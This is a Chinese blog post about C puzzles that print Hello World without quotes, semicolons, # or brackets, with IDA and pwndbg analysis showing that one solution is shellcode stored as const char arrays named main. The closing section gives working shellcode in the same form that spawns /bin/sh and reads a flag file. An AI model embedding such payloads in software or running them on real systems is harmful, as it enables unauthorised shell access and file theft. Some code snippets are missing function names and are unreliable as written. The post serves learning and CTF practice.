    <content type="html"><![CDATA[<p> 前段时间在逛知乎的时候，偶然发现一道有意思的编程题<br><img alt="知乎" data-src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/7hf2r1wl6noec3akgedgzpbqsq.png" class="lozad"><br>参考链接：<a href="https://www.zhihu.com/question/66088898/answer/238036040" target="_blank" rel="noopener">hello world编程题你会吗？</a><br> Helllo World算是最简单也最基础的程序了，我们一般在编写c语言代码的时候，输入输出都会很自然地联想到frintf()和scanf()，这几道题非常地有意思，要求跳出常规思维输出’’Hello World’。</p><h2 id="1-不用-“-“-输出Hello-World！"><a href="#1-不用-“-“-输出Hello-World！" class="headerlink" title="1.不用 “ “ 输出Hello,World！"></a>1.不用 “ “ 输出Hello,World！</h2><p> 不用” “输出，那么就不能用scanf()这个函数了，那么怎么办呢，想到c语言在处理字符常量的时候是把它当做数字来处理的，所以可以用普通char()函数把”Hello World”的每个字符的Ascii码输出。<br> 这道题如果引伸为不用引号来输出(单引号和双引号都不能使用),其实也是一样的，putchar()函数可以直接用数字作为参数。</p><h2 id="2-不用-输出Hello，World！"><a href="#2-不用-输出Hello，World！" class="headerlink" title="2.不用 ; 输出Hello，World！"></a>2.不用 ; 输出Hello，World！</h2><p> 不用;输出，也就是出代码中不能出现完整的语句，仔细思考下在c语言当中哪些位置可以不用;的，发现if语句刚好满足要求。</p><p>附上同时满足条件1和2的程序代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> ()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">72</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">101</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">32</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">87</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">114</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">100</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 这里需要说明的一点是，在最新的c标准中，已经不允许main函数的类型为void。</p><h2 id="3-不用-输出Hello-World！"><a href="#3-不用-输出Hello-World！" class="headerlink" title="3.不用# 输出Hello,World！"></a>3.不用# 输出Hello,World！</h2><p> 这道题不得不感叹自己所学的知识的贫瘠，一直想着怎么在windows编译环境下怎么达到这个条件，看了原帖的回复，说是要重新定义printf()函数，然后在dev里试了试重新定义了一下printf函数，发现报错没有定义printf()这个函数。<br> 后来才发现原来重新定义printf()函数在linux环境下是可以实现要求的。</p><p><img alt="img" data-src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/dl53pg26qconiqrkjv1b43o1g7.png" class="lozad"></p><p>代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format,...)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> ()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"hello, world"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-不用括号输出Hello-World！-包括各种括号-，-lt-gt-，｛｝，［］都不能用"><a href="#4-不用括号输出Hello-World！-包括各种括号-，-lt-gt-，｛｝，［］都不能用" class="headerlink" title="4.不用括号输出Hello,World！(包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )"></a>4.不用括号输出Hello,World！(包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )</h2><p> 第四题出题人并不是为了输出”Hello World”出的题，本意在了解ELF文件格式。<br>附上知乎大佬的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main = <span class="number">0x55</span>, main1 = <span class="number">0x48</span>, main2 = <span class="number">0x89</span>, main3 = <span class="number">0xe5</span>, main4 = <span class="number">0xb8</span>,</span><br><span class="line">           main5 = <span class="number">0x01</span>, main6 = <span class="number">0x00</span>, main7 = <span class="number">0x00</span>, main8 = <span class="number">0x00</span>, main9 = <span class="number">0xbb</span>,</span><br><span class="line">           main10 = <span class="number">0x01</span>, main11 = <span class="number">0x00</span>, main12 = <span class="number">0x00</span>, main13 = <span class="number">0x00</span>,</span><br><span class="line">           main14 = <span class="number">0x67</span>, main15 = <span class="number">0x8d</span>, main16 = <span class="number">0x35</span>, main17 = <span class="number">0x10</span>,</span><br><span class="line">           main18 = <span class="number">0x00</span>, main19 = <span class="number">0x00</span>, main20 = <span class="number">0x00</span>, main21 = <span class="number">0xba</span>,</span><br><span class="line">           main22 = <span class="number">0x0d</span>, main23 = <span class="number">0x00</span>, main24 = <span class="number">0x00</span>, main25 = <span class="number">0x00</span>,</span><br><span class="line">           main26 = <span class="number">0x0f</span>, main27 = <span class="number">0x05</span>, main28 = <span class="number">0xb8</span>, main29 = <span class="number">0x3c</span>,</span><br><span class="line">           main30 = <span class="number">0x00</span>, main31 = <span class="number">0x00</span>, main32 = <span class="number">0x00</span>, main33 = <span class="number">0x31</span>,</span><br><span class="line">           main34 = <span class="number">0xdb</span>, main35 = <span class="number">0x0f</span>, main36 = <span class="number">0x05</span>, main37 = <span class="number">0x48</span>,</span><br><span class="line">           main38 = <span class="number">0x65</span>, main39 = <span class="number">0x6c</span>, main40 = <span class="number">0x6c</span>, main41 = <span class="number">0x6f</span>,</span><br><span class="line">           main42 = <span class="number">0x20</span>, main43 = <span class="number">0x57</span>, main44 = <span class="number">0x6f</span>, main45 = <span class="number">0x72</span>,</span><br><span class="line">           main46 = <span class="number">0x6c</span>, main47 = <span class="number">0x64</span>, main48 = <span class="number">0x21</span>, main49 = <span class="number">0x0a</span>,</span><br><span class="line">           main50 = <span class="number">0x5d</span>;</span><br></pre></td></tr></table></figure><h2 id="5-对上述代码的分析"><a href="#5-对上述代码的分析" class="headerlink" title="5.对上述代码的分析"></a>5.对上述代码的分析</h2><p>其中最让我不能理解的是第四种方式输出的Hello ,World!</p><p>我用gcc编译器，把他编译后运行，的确能输出Hello ,World!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜   gcc test.c -o <span class="built_in">test</span></span><br><span class="line">➜   ./<span class="built_in">test</span></span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure><p>用ida反编译一下，可以看到start函数还是很正常的，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004003E0 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:00000000004003E0 ; __unwind &#123;</span><br><span class="line">.text:00000000004003E0                 xor     ebp, ebp</span><br><span class="line">.text:00000000004003E2                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:00000000004003E5                 pop     rsi             ; argc</span><br><span class="line">.text:00000000004003E6                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:00000000004003E9                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000004003ED                 push    rax</span><br><span class="line">.text:00000000004003EE                 push    rsp             ; stack_end</span><br><span class="line">.text:00000000004003EF                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:00000000004003F6                 mov     rcx, offset __libc_csu_init ; init</span><br><span class="line">.text:00000000004003FD                 mov     rdi, offset main ; main</span><br><span class="line">.text:0000000000400404                 call    ___libc_start_main</span><br><span class="line">.text:0000000000400409                 hlt</span><br><span class="line">.text:0000000000400409 ; &#125; // starts at 4003E0</span><br><span class="line">.text:0000000000400409 _start          endp</span><br><span class="line">.text:0000000000400409</span><br></pre></td></tr></table></figure><p>继续看main函数,就变得很不正常了，而且他是在data段。？？？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000400564 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.rodata:0000000000400564 main            db  55h ; U             ; DATA XREF: _start+1D↑o</span><br><span class="line">.rodata:0000000000400565                 public main1</span><br><span class="line">.rodata:0000000000400565 main1           db  48h ; H</span><br><span class="line">.rodata:0000000000400566                 public main2</span><br><span class="line">.rodata:0000000000400566 main2           db  89h</span><br><span class="line">.rodata:0000000000400567                 public main3</span><br><span class="line">.rodata:0000000000400567 main3           db 0E5h</span><br><span class="line">.rodata:0000000000400568                 public main4</span><br><span class="line">.rodata:0000000000400568 main4           db 0B8h</span><br><span class="line">.rodata:0000000000400569                 public main5</span><br><span class="line">.rodata:0000000000400569 main5           db    1</span><br><span class="line">.rodata:000000000040056A                 public main6</span><br><span class="line">.rodata:000000000040056A main6           db    0</span><br><span class="line">.rodata:000000000040056B                 public main7</span><br><span class="line">.rodata:000000000040056B main7           db    0</span><br><span class="line">.rodata:000000000040056C                 public main8</span><br><span class="line">.rodata:000000000040056C main8           db    0</span><br><span class="line">.rodata:000000000040056D                 public main9</span><br><span class="line">.rodata:000000000040056D main9           db 0BBh</span><br><span class="line">.rodata:000000000040056E                 public main10</span><br><span class="line">.rodata:000000000040056E main10          db    1</span><br><span class="line">.rodata:000000000040056F                 public main11</span><br><span class="line">.rodata:000000000040056F main11          db    0</span><br><span class="line">.rodata:0000000000400570                 public main12</span><br><span class="line">.rodata:0000000000400570 main12          db    0</span><br><span class="line">.rodata:0000000000400571                 public main13</span><br><span class="line">.rodata:0000000000400571 main13          db    0</span><br><span class="line">.rodata:0000000000400572                 public main14</span><br><span class="line">.rodata:0000000000400572 main14          db  67h ; g</span><br><span class="line">.rodata:0000000000400573                 public main15</span><br><span class="line">.rodata:0000000000400573 main15          db  8Dh</span><br><span class="line">.rodata:0000000000400574                 public main16</span><br><span class="line">.rodata:0000000000400574 main16          db  35h ; 5</span><br><span class="line">.rodata:0000000000400575                 public main17</span><br><span class="line">.rodata:0000000000400575 main17          db  10h</span><br><span class="line">.rodata:0000000000400576                 public main18</span><br><span class="line">.rodata:0000000000400576 main18          db    0</span><br><span class="line">.rodata:0000000000400577                 public main19</span><br><span class="line">.rodata:0000000000400577 main19          db    0</span><br><span class="line">.rodata:0000000000400578                 public main20</span><br><span class="line">.rodata:0000000000400578 main20          db    0</span><br><span class="line">.rodata:0000000000400579                 public main21</span><br><span class="line">.rodata:0000000000400579 main21          db 0BAh</span><br><span class="line">.rodata:000000000040057A                 public main22</span><br><span class="line">.rodata:000000000040057A main22          db  0Dh</span><br><span class="line">.rodata:000000000040057B                 public main23</span><br><span class="line">.rodata:000000000040057B main23          db    0</span><br><span class="line">.rodata:000000000040057C                 public main24</span><br><span class="line">.rodata:000000000040057C main24          db    0</span><br><span class="line">.rodata:000000000040057D                 public main25</span><br><span class="line">.rodata:000000000040057D main25          db    0</span><br><span class="line">.rodata:000000000040057E                 public main26</span><br><span class="line">.rodata:000000000040057E main26          db  0Fh</span><br><span class="line">.rodata:000000000040057F                 public main27</span><br><span class="line">.rodata:000000000040057F main27          db    5</span><br><span class="line">.rodata:0000000000400580                 public main28</span><br><span class="line">.rodata:0000000000400580 main28          db 0B8h</span><br><span class="line">.rodata:0000000000400581                 public main29</span><br><span class="line">.rodata:0000000000400581 main29          db  3Ch ; &lt;</span><br><span class="line">.rodata:0000000000400582                 public main30</span><br><span class="line">.rodata:0000000000400582 main30          db    0</span><br><span class="line">.rodata:0000000000400583                 public main31</span><br><span class="line">.rodata:0000000000400583 main31          db    0</span><br><span class="line">.rodata:0000000000400584                 public main32</span><br><span class="line">.rodata:0000000000400584 main32          db    0</span><br><span class="line">.rodata:0000000000400585                 public main33</span><br><span class="line">.rodata:0000000000400585 main33          db  31h ; 1</span><br><span class="line">.rodata:0000000000400586                 public main34</span><br><span class="line">.rodata:0000000000400586 main34          db 0DBh</span><br><span class="line">.rodata:0000000000400587                 public main35</span><br><span class="line">.rodata:0000000000400587 main35          db  0Fh</span><br><span class="line">.rodata:0000000000400588                 public main36</span><br><span class="line">.rodata:0000000000400588 main36          db    5</span><br><span class="line">.rodata:0000000000400589                 public main37</span><br><span class="line">.rodata:0000000000400589 main37          db  48h ; H</span><br><span class="line">.rodata:000000000040058A                 public main38</span><br><span class="line">.rodata:000000000040058A main38          db  65h ; e</span><br><span class="line">.rodata:000000000040058B                 public main39</span><br><span class="line">.rodata:000000000040058B main39          db  6Ch ; l</span><br><span class="line">.rodata:000000000040058C                 public main40</span><br><span class="line">.rodata:000000000040058C main40          db  6Ch ; l</span><br><span class="line">.rodata:000000000040058D                 public main41</span><br><span class="line">.rodata:000000000040058D main41          db  6Fh ; o</span><br><span class="line">.rodata:000000000040058E                 public main42</span><br><span class="line">.rodata:000000000040058E main42          db  20h</span><br><span class="line">.rodata:000000000040058F                 public main43</span><br><span class="line">.rodata:000000000040058F main43          db  57h ; W</span><br><span class="line">.rodata:0000000000400590                 public main44</span><br><span class="line">.rodata:0000000000400590 main44          db  6Fh ; o</span><br><span class="line">.rodata:0000000000400591                 public main45</span><br><span class="line">.rodata:0000000000400591 main45          db  72h ; r</span><br><span class="line">.rodata:0000000000400592                 public main46</span><br><span class="line">.rodata:0000000000400592 main46          db  6Ch ; l</span><br><span class="line">.rodata:0000000000400593                 public main47</span><br><span class="line">.rodata:0000000000400593 main47          db  64h ; d</span><br><span class="line">.rodata:0000000000400594                 public main48</span><br><span class="line">.rodata:0000000000400594 main48          db  21h ; !</span><br><span class="line">.rodata:0000000000400595                 public main49</span><br><span class="line">.rodata:0000000000400595 main49          db  0Ah</span><br><span class="line">.rodata:0000000000400596                 public main50</span><br><span class="line">.rodata:0000000000400596 main50          db  5Dh ; ]</span><br><span class="line">.rodata:0000000000400596 _rodata         ends</span><br></pre></td></tr></table></figure><p>接下来我用gdb动态调试一波,下断点到main函数的地方,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x400564</span><br><span class="line">Breakpoint 2 at 0x400564</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0000000000400564 in main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────</span><br><span class="line"> RAX  0x400564 (main) ◂— push   rbp</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7fffffffde28 —▸ 0x7fffffffe1df ◂— &apos;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&apos;</span><br><span class="line"> RDI  0x1</span><br><span class="line"> RSI  0x7fffffffde18 —▸ 0x7fffffffe1ac ◂— &apos;/mnt/hgfs/ubuntu_share/help/test&apos;</span><br><span class="line"> R8   0x400550 (__libc_csu_fini) ◂— ret    </span><br><span class="line"> R9   0x7ffff7de7ac0 (_dl_fini) ◂— push   rbp</span><br><span class="line"> R10  0x846</span><br><span class="line"> R11  0x7ffff7a2d740 (__libc_start_main) ◂— push   r14</span><br><span class="line"> R12  0x4003e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffde10 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x4004e0 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdd38 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line"> RIP  0x400564 (main) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────</span><br><span class="line"> ► 0x400564 &lt;main&gt;      push   rbp &lt;0x4004e0&gt;</span><br><span class="line">   0x400565 &lt;main1&gt;     mov    rbp, rsp</span><br><span class="line">   0x400568 &lt;main4&gt;     mov    eax, 1</span><br><span class="line">   0x40056d &lt;main9&gt;     mov    ebx, 1</span><br><span class="line">   0x400572 &lt;main14&gt;    lea    esi, [eip + 0x10]</span><br><span class="line">   0x400579 &lt;main21&gt;    mov    edx, 0xd</span><br><span class="line">   0x40057e &lt;main26&gt;    syscall </span><br><span class="line">   0x400580 &lt;main28&gt;    mov    eax, 0x3c</span><br><span class="line">   0x400585 &lt;main33&gt;    xor    ebx, ebx</span><br><span class="line">   0x400587 &lt;main35&gt;    syscall </span><br><span class="line">   0x400589 &lt;main37&gt;    insb   byte ptr [rdi], dx</span><br><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdd38 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">01:0008│      0x7fffffffdd40 ◂— 0x1</span><br><span class="line">02:0010│      0x7fffffffdd48 —▸ 0x7fffffffde18 —▸ 0x7fffffffe1ac ◂— &apos;/mnt/hgfs/ubuntu_share/help/test&apos;</span><br><span class="line">03:0018│      0x7fffffffdd50 ◂— 0x1f7ffcca0</span><br><span class="line">04:0020│      0x7fffffffdd58 —▸ 0x400564 (main) ◂— push   rbp</span><br><span class="line">05:0028│      0x7fffffffdd60 ◂— 0x0</span><br><span class="line">06:0030│      0x7fffffffdd68 ◂— 0x74c583ff1005bf92</span><br><span class="line">07:0038│      0x7fffffffdd70 —▸ 0x4003e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────</span><br><span class="line"> ► f 0           400564 main</span><br><span class="line">   f 1     7ffff7a2d830 __libc_start_main+240</span><br><span class="line">Breakpoint *0x400564</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>看到这里我明白了，上述代码其实是一段shellcode，gcc编译器是如何识别并编译的，这里我不得而知，看来还要再看一遍程序员的自我修养啊。</p><p>分析一下生成的汇编吧。<code>0x400572 &lt;main14&gt;    lea    esi, [eip + 0x10]</code> 其中这段汇编让我很感兴趣，</p><p>程序动态执行的时候总是把静态的数据用这种方式<code>[eip + 0x10]</code>来传参</p><p>很显然里面存的是Hello world，然后syscall系统调用write函数输出，第二次syscall系统调用exit函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10s 0x400579+0x10</span><br><span class="line">0x400589 &lt;main37&gt;:&quot;Hello World!\n]&quot;</span><br><span class="line">0x400598:&quot;\001\033\003;,&quot;</span><br><span class="line">0x40059e:&quot;&quot;</span><br><span class="line">0x40059f:&quot;&quot;</span><br><span class="line">0x4005a0:&quot;\004&quot;</span><br><span class="line">0x4005a2:&quot;&quot;</span><br><span class="line">0x4005a3:&quot;&quot;</span><br><span class="line">0x4005a4:&quot;\030\376\377\377x&quot;</span><br><span class="line">0x4005aa:&quot;&quot;</span><br><span class="line">0x4005ab:&quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="6-模仿操作"><a href="#6-模仿操作" class="headerlink" title="6.模仿操作"></a>6.模仿操作</h2><p>用上述方式写 execve(“/bin/sh”)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>  main = <span class="number">0x6a</span>, main1 = <span class="number">0x42</span>, main2 = <span class="number">0x58</span>, main3 = <span class="number">0xfe</span>, main4 = <span class="number">0xc4</span>, main5 = <span class="number">0x48</span>, main6 = <span class="number">0x99</span>, main7 = <span class="number">0x52</span>, main8 = <span class="number">0x48</span>, main9 = <span class="number">0xbf</span>,main10 = <span class="number">0x2f</span>, main11 = <span class="number">0x62</span>, main12 = <span class="number">0x69</span>, main13 = <span class="number">0x6e</span>, main14 = <span class="number">0x2f</span>, main15 = <span class="number">0x2f</span>, main16 = <span class="number">0x73</span>, main17 = <span class="number">0x68</span>, main18 = <span class="number">0x57</span>, main19 = <span class="number">0x54</span>,main20 = <span class="number">0x5e</span>, main21 = <span class="number">0x49</span>, main22 = <span class="number">0x89</span>, main23 = <span class="number">0xd0</span>, main24 = <span class="number">0x49</span>, main25 = <span class="number">0x89</span>, main26 = <span class="number">0xd2</span>, main27 = <span class="number">0x0f</span>, main28 = <span class="number">0x05</span>;</span><br></pre></td></tr></table></figure><p>orw flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main=<span class="number">0x48</span>,main1=<span class="number">0xb8</span>,main2=<span class="number">0x1</span>,main3=<span class="number">0x1</span>,main4=<span class="number">0x1</span>,main5=<span class="number">0x1</span>,main6=<span class="number">0x1</span>,main7=<span class="number">0x1</span>,main8=<span class="number">0x1</span>,main9=<span class="number">0x1</span>,main10=<span class="number">0x50</span>,main11=<span class="number">0x48</span>,main12=<span class="number">0xb8</span>,main13=<span class="number">0x67</span>,main14=<span class="number">0x2e</span>,main15=<span class="number">0x67</span>,main16=<span class="number">0x6d</span>,main17=<span class="number">0x60</span>,main18=<span class="number">0x66</span>,main19=<span class="number">0x1</span>,main20=<span class="number">0x1</span>,main21=<span class="number">0x48</span>,main22=<span class="number">0x31</span>,main23=<span class="number">0x4</span>,main24=<span class="number">0x24</span>,main25=<span class="number">0x48</span>,main26=<span class="number">0xb8</span>,main27=<span class="number">0x2f</span>,main28=<span class="number">0x68</span>,main29=<span class="number">0x6f</span>,main30=<span class="number">0x6d</span>,main31=<span class="number">0x65</span>,main32=<span class="number">0x2f</span>,main33=<span class="number">0x63</span>,main34=<span class="number">0x74</span>,main35=<span class="number">0x50</span>,main36=<span class="number">0x48</span>,main37=<span class="number">0x89</span>,main38=<span class="number">0xe7</span>,main39=<span class="number">0x31</span>,main40=<span class="number">0xd2</span>,main41=<span class="number">0x31</span>,main42=<span class="number">0xf6</span>,main43=<span class="number">0x6a</span>,main44=<span class="number">0x2</span>,main45=<span class="number">0x58</span>,main46=<span class="number">0xf</span>,main47=<span class="number">0x5</span>,main48=<span class="number">0x31</span>,main49=<span class="number">0xc0</span>,main50=<span class="number">0x6a</span>,main51=<span class="number">0x3</span>,main52=<span class="number">0x5f</span>,main53=<span class="number">0x6a</span>,main54=<span class="number">0x20</span>,main55=<span class="number">0x5a</span>,main56=<span class="number">0x48</span>,main57=<span class="number">0x89</span>,main58=<span class="number">0xe6</span>,main59=<span class="number">0xf</span>,main60=<span class="number">0x5</span>,main61=<span class="number">0x6a</span>,main62=<span class="number">0x1</span>,main63=<span class="number">0x5f</span>,main64=<span class="number">0x6a</span>,main65=<span class="number">0x20</span>,main66=<span class="number">0x5a</span>,main67=<span class="number">0x48</span>,main68=<span class="number">0x89</span>,main69=<span class="number">0xe6</span>,main70=<span class="number">0x6a</span>,main71=<span class="number">0x1</span>,main72=<span class="number">0x58</span>,main73=<span class="number">0xf</span>,main74=<span class="number">0x5</span>;</span><br></pre></td></tr></table></figure><p>参考：</p><p>有趣的”Hello World”</p><p><a href="https://www.dazhuanlan.com/2020/03/03/5e5d97d48a85f/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2020/03/03/5e5d97d48a85f/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; 前段时间在逛知乎的时候，偶然发现一道有意思的编程题&lt;br&gt;&lt;img alt=&quot;知乎&quot; data-src=&quot;https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/7hf2r1wl6noec3akgedgzpbq
      
    
    </summary>
    
      <category term="c" scheme="https://nocbtm.github.io/categories/c/"/>
    
    
      <category term="c" scheme="https://nocbtm.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>__stack_chk_fail相关利用</title>
